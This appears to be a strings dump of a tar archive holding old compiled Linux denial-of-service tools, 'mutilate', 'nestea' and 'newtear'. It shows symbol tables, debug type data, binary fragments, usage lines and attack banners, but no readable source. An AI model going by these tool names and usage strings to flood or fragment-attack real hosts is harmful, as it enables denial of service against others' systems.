            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "misfrag.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "htonl@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "sendpack",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "resolve_name",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/mutilate",
            "0100755",
            "0000000",
            "0000000",
            "00000034171",
            "07100656637",
            "013722",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "strerror",
            "puts",
            "socket",
            "inet_addr",
            "__deregister_frame_info",
            "strncpy",
            "strcmp",
            "shutdown",
            "gethostbyname",
            "isdigit",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u010b",
            "1fEP",
            "UPEP",
            "\u0403;u[]",
            "Mutilate",
            "usage: %s <IP address> <port (or -s for scan)>",
            "Mutilate by HoGs HeaD and Inertia",
            "----------------------------------",
            "Socket cannot be established!",
            "Found an open port on %d...",
            "Beginning a port scan on %s...",
            "Now opening connections to %s...",
            "Error setting up socket!",
            "Error connecting to: %d : %s",
            "Opened %d sockets to host...",
            "Opened 400 socks to server, ending...",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "mutilate.c",
            "portscan",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "strcmp@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "strerror@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "shutdown@@GLIBC_2.0",
            "puts@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "isdigit@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "strncpy@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/nestea",
            "0100755",
            "0000000",
            "0000000",
            "00000037554",
            "07100656643",
            "013362",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "getopt",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRhD",
            "QVhp",
            "U4SE",
            "EP }!h",
            "ntNdtt']t&",
            "fEW&",
            "fE7&",
            "u7E\u0739",
            ")\u044bE)fEf}",
            "u7E\u0739",
            ")\u044bE)fE}",
            "EE1fEPEP",
            "EE1fEPEP",
            "EPhd",
            "E;E|",
            "1fEP1fEPEPEPEPF",
            "E\ubc03hx",
            "U@VSE",
            "fEfUE",
            "fEfE\u078bE",
            "EEEh",
            "EPEPC",
            "EPE@P",
            "1fEP",
            "1fEP",
            "U\u0709Pj",
            "j&EPE",
            "P u,h{",
            "EPEP",
            "EPE@P[",
            "1fEP",
            "1fEPo",
            "U\u0709Pj",
            "P\\ u,h{",
            "EEhD",
            "EPEPf",
            "EPE@P",
            "E,1fEP",
            "1fEP",
            "OE\u060bUM",
            "E\u053bE\u044bE\u060d",
            ")\u02cbE)\u060bU\u0508",
            "EE\ub9d0j",
            "U\u0709Pj",
            "P u,h{",
            "e[^]",
            "Uu>E",
            "1'EP",
            "REPEP",
            "\u0403;u[]",
            "raw socket",
            "IP_HDRINCL",
            "What the hell kind of IP address is that?",
            "s:t:n:",
            "Nestea by humble",
            "Code ripped from teardrop by route / daemon9",
            "Death on flaxen wings (yet again):",
            "From: %15s.%5d",
            "  To: %15s.%5d",
            " Amt: %5d",
            "b00m ",
            "sendto",
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "nestea.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/newtear",
            "0100755",
            "0000000",
            "0000000",
            "00000036155",
            "07100656644",
            "013545",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "getopt",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVhp",
            "U4SE",
            "EP } h",
            "ntNdtt']t&",
            "fEW&",
            "fE7&",
            "u7E\u0739",
            ")\u044bE)fEf}",
            "u7E\u0739",
            ")\u044bE)fE}",
            "EE1fEPEP ",
            "EE1fEPEP",
            "EPhj",
            "E;E|",
            "1fEP1fEPEPEPEPF",
            "E\ubc03h~",
            "U4SE",
            "fEfUE",
            "fEfEE",
            "EEEj0EP",
            "EPEPJ",
            "EPE@P",
            "1fEP",
            "1fEP",
            "j0EPE",
            "P u-h",
            "PE u3h",
            "Uu=E",
            "1)EP",
            "REPEP",
            "\u0403;u[]",
            "teardrop   route|daemon9",
            "raw socket",
            "IP_HDRINCL",
            "What the hell kind of IP address is that?",
            "s:t:n:",
            "Death on flaxen wings:",
            "From: %15s.%5d",
            "  To: %15s.%5d",
            " Amt: %5d",
            "b00m ",
            "sendto",
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
